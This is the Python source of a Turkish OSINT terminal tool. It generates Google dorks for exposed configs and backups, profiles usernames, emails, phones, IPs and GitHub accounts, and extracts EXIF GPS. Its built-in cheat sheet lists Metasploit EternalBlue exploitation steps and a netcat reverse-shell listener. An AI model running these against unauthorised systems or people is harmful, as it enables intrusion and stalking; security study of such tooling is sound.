"""
terminal_app.py - Diosint Cyber / CMD Hacker Edition
=====================================================
Görseldeki OAIO tarzı neon pembe/mor ASCII banner ve çerçeveli
numaralı interaktif menü konsolu.

Bu dosya, projenin 'Ana Yönetim Merkezi'dir (Controller).
Kullanıcıdan girdiyi alır, ilgili modülü çağırır ve Rich kütüphanesi
ile terminale estetik tablolar ve paneller çizer.
"""

from __future__ import annotations
import sys
import io
import os
import asyncio
from pathlib import Path

# Windows terminallerinde Türkçe karakter ve özel sembollerin çökmemesi için UTF-8 kilidi
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
        sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

# Rich Kütüphanesi: Terminali renkli ve modern panellerle süslemek için kullanılır
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt
from rich.align import Align
from rich.text import Text

console = Console()

# ── Çekirdek İstihbarat Modülleri (modules/ dizininden yüklenir) ─────────────
from modules.username_lookup import lookup_username, to_dict_list as username_to_dict
from modules.ip_lookup import lookup_ip
from modules.email_osint import analyze_email
from modules.phone_lookup import analyze_phone
from modules.darkweb import search_darkweb
from modules.geoint import lookup_coords
from modules.scraper import scrape_target
from modules.subdomain_recon import discover_subdomains
from modules.metadata_extractor import extract_metadata
from utils.output_handler import save_report
from config import REPORTS_DIR


def clear_screen():
    """Terminal ekranını temizler (Windows: cls, Linux/Mac: clear)."""
    os.system("cls" if os.name == "nt" else "clear")


def render_banner():
    """Görseldeki neon mor/pembe degrade pixel DIOSINT banner'ını çizer."""
    banner_text = """
 [bold #d946ef]██████╗ ██╗ ██████╗ ███████╗██╗███╗   ██╗████████╗[/]
 [bold #c026d3]██╔══██╗██║██╔═══██╗██╔════╝██║████╗  ██║╚══██╔══╝[/]
 [bold #a855f7]██║  ██║██║██║   ██║███████╗██║██╔██╗ ██║   ██║   [/]
 [bold #9333ea]██║  ██║██║██║   ██║╚════██║██║██║╚██╗██║   ██║   [/]
 [bold #7e22ce]██████╔╝██║╚██████╔╝███████║██║██║ ╚████║   ██║   [/]
 [bold #6b21a8]╚═════╝ ╚═╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   [/]
    """
    console.print(banner_text)
    console.print(
        Align.center("[bold #ec4899]github.com/diosint  |  v2.0 Cyber Intelligence Edition[/bold #ec4899]")
    )
    console.print()


def render_menu():
    """Görseldeki 3 sütunlu mor neon çerçeveli seçim menüsünü üretir."""
    menu_content = Text()
    
    # 1. Satır
    menu_content.append(" [1] ", style="bold #d946ef")
    menu_content.append("Google Dork Recon        ", style="white")
    menu_content.append(" [6] ", style="bold #d946ef")
    menu_content.append("Domain / Web Tech        ", style="white")
    menu_content.append(" [11] ", style="bold #d946ef")
    menu_content.append("Dark Web (.onion)\n", style="white")

    # 2. Satır
    menu_content.append(" [2] ", style="bold #d946ef")
    menu_content.append("Username Lookup (40+)    ", style="white")
    menu_content.append(" [7] ", style="bold #d946ef")
    menu_content.append("IP / Ağ Altyapısı        ", style="white")
    menu_content.append(" [12] ", style="bold #d946ef")
    menu_content.append("GEOINT / Konum\n", style="white")

    # 3. Satır
    menu_content.append(" [3] ", style="bold #d946ef")
    menu_content.append("Email & Breach (HIBP)    ", style="white")
    menu_content.append(" [8] ", style="bold #d946ef")
    menu_content.append("Discord / Server Invite  ", style="white")
    menu_content.append(" [13] ", style="bold #d946ef")
    menu_content.append("Subdomain Recon (crt.sh)\n", style="white")

    # 4. Satır
    menu_content.append(" [4] ", style="bold #d946ef")
    menu_content.append("Phone Lookup             ", style="white")
    menu_content.append(" [9] ", style="bold #d946ef")
    menu_content.append("Site Robots & Security   ", style="white")
    menu_content.append(" [14] ", style="bold #d946ef")
    menu_content.append("EXIF / Image Forensic\n", style="white")

    # 5. Satır
    menu_content.append(" [5] ", style="bold #d946ef")
    menu_content.append("Toplu İstihbarat Taraması", style="white")
    menu_content.append(" [10] ", style="bold #d946ef")
    menu_content.append("Github Deep Profiler     ", style="white")
    menu_content.append(" [15] ", style="bold #d946ef")
    menu_content.append("Rapor Arşivi\n\n", style="white")

    # 6. Satır
    menu_content.append(" [16] ", style="bold #d946ef")
    menu_content.append("CyberNotes Kılavuz       ", style="white")
    menu_content.append(" [00] ", style="bold #ef4444")
    menu_content.append("Exit / Çıkış\n", style="bold #ef4444")

    panel = Panel(
        menu_content,
        border_style="bold #d946ef",
        padding=(1, 2),
        subtitle="[bold #ec4899]DIOSINT CMD CONSOLE[/bold #ec4899]",
        subtitle_align="right"
    )
    console.print(panel)


# ═════════════════════════════════════════════════════════════════════════════
# MODÜL İŞLEYİCİLERİ (Her seçenek buradaki bağımsız fonksiyonu çalıştırır)
# ═════════════════════════════════════════════════════════════════════════════

def run_google_dork():
    """[1] Google arama motorunda hassas dosyaları bulmak için dork üretir."""
    console.print("\n[bold #d946ef]=== [1] GOOGLE DORK RECON GENERATOR ===[/bold #d946ef]\n")
    domain = Prompt.ask("[bold white]Hedef Domain / Şirket Adı[/bold white]")
    if not domain:
        return
    
    dorks = [
        ("Login / Admin Panelleri", f"site:{domain} inurl:admin | inurl:login | inurl:adminlogin"),
        ("Açık Dizinler (Directory Listing)", f"site:{domain} intitle:\"index of /\""),
        ("Kritik Konfigürasyon Dosyaları", f"site:{domain} ext:env | ext:yml | ext:json | ext:conf"),
        ("Veritabanı ve SQL Yedekleri", f"site:{domain} ext:sql | ext:db | ext:sqlite | ext:bak"),
        ("Herkese Açık Belgeler", f"site:{domain} ext:doc | ext:docx | ext:pdf | ext:xls | ext:xlsx"),
        ("PHP Bilgi & Debug Sayfaları", f"site:{domain} \"phpinfo()\" | inurl:info.php"),
        ("Gizli API Endpointleri", f"site:{domain} inurl:api | inurl:v1 | inurl:graphql"),
    ]
    
    table = Table(title=f"Google Dork Sorguları: {domain}", border_style="#d946ef")
    table.add_column("Kategori", style="bold #ec4899")
    table.add_column("Google Dork Sorgusu", style="bold white")
    for cat, query in dorks:
        table.add_row(cat, query)
    
    console.print(table)
    console.print("\n[dim]İpucu: Bu dorkları Google'a yapıştırarak hedef sitedeki açık kaynak sızıntılarını tespit edebilirsiniz.[/dim]\n")


def run_username():
    """[2] Kullanıcı adını 40+ platformda eş zamanlı (asenkron) olarak arar."""
    console.print("\n[bold #d946ef]=== [2] USERNAME LOOKUP (40+ PLATFORM) ===[/bold #d946ef]\n")
    target = Prompt.ask("[bold white]Hedef Kullanıcı Adı[/bold white]")
    if not target:
        return
    
    with console.status(f"[bold #d946ef]'{target}' takma adı 40+ platformda taranıyor...[/bold #d946ef]", spinner="dots"):
        results = asyncio.run(lookup_username(target))
    
    found = [r for r in results if r.found]
    console.print(f"\n[green]Toplam {len(found)} eşleşen profil bulundu![/green]\n")
    
    table = Table(border_style="#d946ef")
    table.add_column("Platform", style="bold #ec4899")
    table.add_column("Kategori", style="dim")
    table.add_column("Profil Linki", style="cyan")
    table.add_column("HTTP", style="green")
    
    for r in found:
        table.add_row(r.platform, r.category, r.url, str(r.status_code))
    
    console.print(table)
    report_file = save_report(username_to_dict(results), "username_lookup", target)
    console.print(f"\n[bold green]Rapor kaydedildi:[/] [dim]{report_file.name}[/dim]\n")


def run_email():
    """[3] E-postanın MX doğruluğunu ve HaveIBeenPwned veri sızıntılarını sorgular."""
    console.print("\n[bold #d946ef]=== [3] EMAIL OSINT & BREACH LOOKUP ===[/bold #d946ef]\n")
    email = Prompt.ask("[bold white]Hedef E-posta Adresi[/bold white]")
    if not email:
        return
    
    with console.status("[bold #d946ef]E-posta ve ihlal kayıtları taranıyor...[/bold #d946ef]", spinner="dots"):
        res = asyncio.run(analyze_email(email))
    
    console.print(f"\n[bold white]Servis Sağlayıcı:[/] [cyan]{res.get('provider')}[/cyan]")
    console.print(f"[bold white]MX Kayıtları:[/] {res.get('mx_records', [])}")
    
    count = res.get("breach_count", 0)
    if count > 0:
        console.print(f"\n[bold red][!] DİKKAT: Bu e-posta {count} veri sızıntısında yer alıyor![/bold red]\n")
        table = Table(title="Sızıntı Veritabanı Kayıtları", border_style="red")
        table.add_column("Sızıntı Adı", style="bold yellow")
        table.add_column("Tarih", style="dim")
        table.add_column("Veri Tipleri", style="white")
        for b in res.get("breaches", []):
            table.add_row(
                b.get("Name", "-"),
                b.get("BreachDate", "-"),
                ", ".join(b.get("DataClasses", [])[:4])
            )
        console.print(table)
    else:
        console.print("\n[bold green][+] Temiz: Herhangi bir sızıntı kaydı bulunamadı.[/bold green]\n")
    
    save_report(res, "email_osint", email)


def run_phone():
    """[4] Telefon numarasını temizler ve uluslararası ülke kodu eşleştirmesi yapar."""
    console.print("\n[bold #d946ef]=== [4] PHONE NUMBER LOOKUP ===[/bold #d946ef]\n")
    phone = Prompt.ask("[bold white]Telefon Numarası (Örn: +905551234567)[/bold white]")
    if not phone:
        return
    analyze_phone(phone)


def run_domain():
    """[6] Web sitesinin CMS, framework, SSL, DNS ve guvenlik basliklarini analiz eder."""
    console.print("\n[bold #d946ef]=== [6] FULL-STACK WEB TECH & RECON ENGINE ===[/bold #d946ef]\n")
    url = Prompt.ask("[bold white]Hedef URL (Örn: https://example.com)[/bold white]")
    if not url:
        return
    
    with console.status("[bold #d946ef]Web sitesi, SSL, DNS ve teknolojiler derinlemesine taranıyor...[/bold #d946ef]", spinner="dots"):
        data = asyncio.run(scrape_target(url))
    
    if "error" in data and not data.get("title"):
        console.print(f"[red]Hata: {data['error']}[/red]")
        return
    
    save_report(data, "web_recon", data.get("domain", "site"))


def run_ip():
    """[7] IP adresinin ters DNS, ISP, ASN, şehir ve koordinat bilgilerini çeker."""
    console.print("\n[bold #d946ef]=== [7] IP & NETWORK RECON ===[/bold #d946ef]\n")
    target = Prompt.ask("[bold white]Hedef IP veya Domain (Örn: 1.1.1.1 veya cloudflare.com)[/bold white]")
    if not target:
        return
    
    with console.status("[bold #d946ef]Ağ verileri çözümleniyor...[/bold #d946ef]", spinner="dots"):
        data = asyncio.run(lookup_ip(target))
    
    geo = data.get("geolocation", {})
    table = Table(title=f"IP Analiz Raporu: {target}", border_style="#d946ef")
    table.add_column("Parametre", style="bold #ec4899")
    table.add_column("Bilgi", style="white")
    
    table.add_row("IP Adresi", data.get("ip", target))
    table.add_row("Ülke", f"{geo.get('country', '-')} ({geo.get('country_code', '-')})")
    table.add_row("Şehir / Bölge", f"{geo.get('city', '-')} / {geo.get('region', '-')}")
    table.add_row("ISP / Organizasyon", str(geo.get("isp", "-")))
    table.add_row("Ters DNS (PTR)", str(data.get("reverse_dns") or "Yok"))
    table.add_row("Koordinatlar", f"{geo.get('lat', '-')}, {geo.get('lon', '-')}")
    
    console.print(table)
    save_report(data, "ip_lookup", target)


def run_discord():
    """[8] Discord davet linki veya kodundan sunucu istihbaratını çeker."""
    console.print("\n[bold #d946ef]=== [8] DISCORD SERVER RECON ===[/bold #d946ef]\n")
    invite = Prompt.ask("[bold white]Discord Davet Kodu veya Linki (Örn: discord.gg/cyber)[/bold white]")
    if not invite:
        return
    
    code = invite.split("/")[-1].strip()
    import httpx
    with console.status("[bold #d946ef]Discord API sorgulanıyor...[/bold #d946ef]", spinner="dots"):
        try:
            resp = httpx.get(f"https://discord.com/api/v9/invites/{code}?with_counts=true", timeout=8)
            if resp.status_code == 200:
                d = resp.json()
                guild = d.get("guild", {})
                table = Table(title=f"Discord Sunucusu: {guild.get('name')}", border_style="#d946ef")
                table.add_column("Özellik", style="bold #ec4899")
                table.add_column("Değer", style="white")
                table.add_row("Sunucu Adı", guild.get("name", "-"))
                table.add_row("Sunucu ID", guild.get("id", "-"))
                table.add_row("Açıklama", guild.get("description") or "Yok")
                table.add_row("Toplam Üye", str(d.get("approximate_member_count", 0)))
                table.add_row("Aktif / Online", str(d.get("approximate_presence_count", 0)))
                console.print(table)
            else:
                console.print(f"[red]Geçersiz davet veya sunucu bulunamadı (HTTP {resp.status_code})[/red]")
        except Exception as e:
            console.print(f"[red]Hata: {e}[/red]")


def run_robots():
    """[9] Hedef sitenin robots.txt ve sitemap.xml yollarını inceler."""
    console.print("\n[bold #d946ef]=== [9] SITE ROBOTS.TXT & SECURITY PATHS ===[/bold #d946ef]\n")
    domain = Prompt.ask("[bold white]Hedef Domain (Örn: example.com)[/bold white]")
    if not domain:
        return
    
    if not domain.startswith("http"):
        domain = "https://" + domain
        
    import httpx
    paths = ["/robots.txt", "/sitemap.xml", "/.well-known/security.txt"]
    with console.status("[bold #d946ef]Kritik sistem dosyaları kontrol ediliyor...[/bold #d946ef]", spinner="dots"):
        for p in paths:
            try:
                resp = httpx.get(domain + p, timeout=6.0, follow_redirects=True)
                if resp.status_code == 200:
                    console.print(f"[bold green][+] BULUNDU:[/] [cyan]{domain + p}[/cyan]")
                    preview = resp.text[:250].strip()
                    console.print(Panel(preview, title=p, border_style="#d946ef"))
                else:
                    console.print(f"[dim][-] Bulunamadı: {p} ({resp.status_code})[/dim]")
            except Exception as e:
                console.print(f"[red]Hata ({p}): {e}[/red]")


def run_github():
    """[10] GitHub API üzerinden geliştiricinin gizli kalmış profil detaylarını çeker."""
    console.print("\n[bold #d946ef]=== [10] GITHUB DEEP PROFILER ===[/bold #d946ef]\n")
    user = Prompt.ask("[bold white]Github Kullanıcı Adı (Örn: torvalds)[/bold white]")
    if not user:
        return
    
    import httpx
    with console.status("[bold #d946ef]GitHub API sorgulanıyor...[/bold #d946ef]", spinner="dots"):
        try:
            resp = httpx.get(f"https://api.github.com/users/{user}", timeout=10.0)
            if resp.status_code == 200:
                meta = resp.json()
                table = Table(title=f"GitHub Profili: {user}", border_style="#d946ef")
                table.add_column("Alan", style="bold #ec4899")
                table.add_column("Değer", style="white")
                table.add_row("İsim", meta.get("name") or "Yok")
                table.add_row("Biyografi", meta.get("bio") or "Yok")
                table.add_row("Şirket", meta.get("company") or "Yok")
                table.add_row("Konum", meta.get("location") or "Yok")
                table.add_row("Açık Repolar", str(meta.get("public_repos", 0)))
                table.add_row("Takipçi", str(meta.get("followers", 0)))
                table.add_row("Blog / Site", meta.get("blog") or "Yok")
                console.print(table)
            else:
                console.print(f"[red]GitHub kullanıcısı bulunamadı (HTTP {resp.status_code})[/red]")
        except Exception as e:
            console.print(f"[red]Bağlantı hatası: {e}[/red]")


def run_darkweb():
    """[11] Tor ağı indeksleyicisi Ahmia üzerinden .onion sitelerinde arama yapar."""
    console.print("\n[bold #d946ef]=== [11] DARK WEB (.ONION) SEARCH ===[/bold #d946ef]\n")
    query = Prompt.ask("[bold white]Tor Arama Kelimesi[/bold white]")
    if not query:
        return
    
    with console.status("[bold #d946ef]Ahmia .onion indeksleri taranıyor...[/bold #d946ef]", spinner="dots"):
        results = asyncio.run(search_darkweb(query))
    
    if results:
        console.print(f"\n[green]Toplam {len(results)} Tor indeksi bulundu:[/green]\n")
        for i, item in enumerate(results[:10], 1):
            console.print(f"[bold #ec4899][{i}] {item.get('title')}[/bold #ec4899]")
            console.print(f"[cyan]{item.get('url')}[/cyan]")
            console.print(f"[dim]{item.get('snippet')[:140]}...[/dim]\n")
        save_report(results, "darkweb", query)
    else:
        console.print("[yellow]Sonuç bulunamadı.[/yellow]")


def run_geoint():
    """[12] Enlem ve boylamdan tam adres ve harita konumu çözümler."""
    console.print("\n[bold #d946ef]=== [12] GEOINT COORDINATE LOOKUP ===[/bold #d946ef]\n")
    lat = Prompt.ask("[bold white]Enlem (Lat)[/bold white]", default="41.0082")
    lon = Prompt.ask("[bold white]Boylam (Lon)[/bold white]", default="28.9784")
    
    with console.status("[bold #d946ef]Koordinatlar çözümleniyor...[/bold #d946ef]", spinner="dots"):
        data = asyncio.run(lookup_coords(lat, lon))
    
    console.print(f"\n[bold white]Çözümlenen Adres:[/] [bold cyan]{data.get('display_name')}[/bold cyan]\n")
    save_report(data, "geoint", f"{lat}_{lon}")


def run_subdomains():
    """[13] Certificate Transparency loglarından pasif alt alan adı taraması."""
    console.print("\n[bold #d946ef]=== [13] PASSIVE SUBDOMAIN RECON (CRT.SH) ===[/bold #d946ef]\n")
    domain = Prompt.ask("[bold white]Hedef Domain (Örn: example.com)[/bold white]")
    if not domain:
        return
    with console.status("[bold #d946ef]Sertifika kayıtları ve DNS logları taranıyor...[/bold #d946ef]", spinner="dots"):
        res = asyncio.run(discover_subdomains(domain))
    save_report(res, "subdomains", domain)


def run_exif():
    """[14] Görsel dosyalarından EXIF ve gömülü GPS koordinatlarını çıkarır."""
    console.print("\n[bold #d946ef]=== [14] IMAGE & EXIF METADATA FORENSIC ===[/bold #d946ef]\n")
    path = Prompt.ask("[bold white]Görsel Dosya Yolu (Örn: photo.jpg)[/bold white]")
    if not path:
        return
    clean_path = path.strip("\"'")
    res = extract_metadata(clean_path)
    if res.get("exif_found"):
        save_report(res, "exif_metadata", Path(clean_path).stem)


def run_reports():
    """[15] Oluşturulan HTML ve JSON formatındaki raporları listeler."""
    console.print("\n[bold #d946ef]=== [15] RAPOR VE İSTİHBARAT ARŞİVİ ===[/bold #d946ef]\n")
    files = sorted(list(REPORTS_DIR.glob("*.*")), key=os.path.getmtime, reverse=True)
    if not files:
        console.print("[dim]Kayıtlı rapor bulunmuyor.[/dim]\n")
        return
    
    table = Table(title="Mevcut Rapor Dosyaları", border_style="#d946ef")
    table.add_column("No", style="bold #ec4899")
    table.add_column("Dosya Adı", style="white")
    table.add_column("Boyut", style="dim")
    table.add_column("Tür", style="cyan")
    
    for i, f in enumerate(files[:15], 1):
        ext = "HTML Executive" if f.suffix == ".html" else "JSON Raw Data"
        size_kb = f"{f.stat().st_size / 1024:.1f} KB"
        table.add_row(str(i), f.name, size_kb, ext)
    
    console.print(table)
    console.print(f"\n[dim]Tüm raporlar {REPORTS_DIR} dizininde kayıtlıdır.[/dim]\n")


def run_cybernotes():
    """[16] Nmap, Metasploit, FFUF ve PrivEsc için pratik komut referansı."""
    console.print("\n[bold #d946ef]=== [16] CYBERNOTES SİBER GÜVENLİK KILAVUZU ===[/bold #d946ef]\n")
    console.print("""
[bold #ec4899]1. NMAP HIZLI VE TAM TARAMA:[/]
   [white]nmap -p- -sS -sV -sC -T4 -Pn <HEDEF_IP> -oA full_scan[/white]

[bold #ec4899]2. SMB ZAAFİYET KONTROLÜ (ETERNALBLUE):[/]
   [white]nmap -p 445 --script "vuln and smb*" <HEDEF_IP>[/white]

[bold #ec4899]3. WEB DİZİN VE HASSAS DOSYA FUZZING (FFUF):[/]
   [white]ffuf -w wordlist.txt -u http://<HEDEF_IP>/FUZZ -fc 404[/white]

[bold #ec4899]4. METASPLOIT TEMEL SÖMÜRÜ ADIMI:[/]
   [white]msfconsole -q[/white]
   [white]use exploit/windows/smb/ms17_010_eternalblue[/white]
   [white]set RHOSTS <HEDEF_IP>[/white]
   [white]set LHOST <KENDI_IP>[/white]
   [white]exploit[/white]

[bold #ec4899]5. REVERSE SHELL DİNLEME:[/]
   [white]nc -lvnp 4444[/white]
    """)


# ── Ana Döngü (Uygulamanın çalıştığı sürece dönen fonksiyon) ────────────────

def main():
    """Programın ana döngüsü. Menüyü çizer, seçimi alır ve yönlendirir."""
    while True:
        clear_screen()
        render_banner()
        render_menu()
        
        try:
            choice = Prompt.ask("[bold white]Input >[/bold white]").strip()
        except (KeyboardInterrupt, EOFError):
            console.print("\n[red]Çıkış yapılıyor...[/red]")
            break
            
        if choice in ("0", "00", "exit", "quit", "q"):
            console.print("\n[bold #d946ef]Diosint kapatıldı. Güvenli günler![/bold #d946ef]\n")
            break
        elif choice == "1":
            run_google_dork()
        elif choice == "2":
            run_username()
        elif choice == "3":
            run_email()
        elif choice == "4":
            run_phone()
        elif choice == "5":
            console.print("\n[bold yellow]Toplu tarama başlatılıyor...[/bold yellow]")
            run_username()
            run_email()
        elif choice == "6":
            run_domain()
        elif choice == "7":
            run_ip()
        elif choice == "8":
            run_discord()
        elif choice == "9":
            run_robots()
        elif choice == "10":
            run_github()
        elif choice == "11":
            run_darkweb()
        elif choice == "12":
            run_geoint()
        elif choice == "13":
            run_subdomains()
        elif choice == "14":
            run_exif()
        elif choice == "15":
            run_reports()
        elif choice == "16":
            run_cybernotes()
        else:
            console.print("[red]Geçersiz seçim! Lütfen menüdeki bir numarayı girin.[/red]")
            
        console.print("[dim]Devam etmek için Enter'a basın...[/dim]", end="")
        try:
            input()
        except:
            pass


if __name__ == "__main__":
    main()
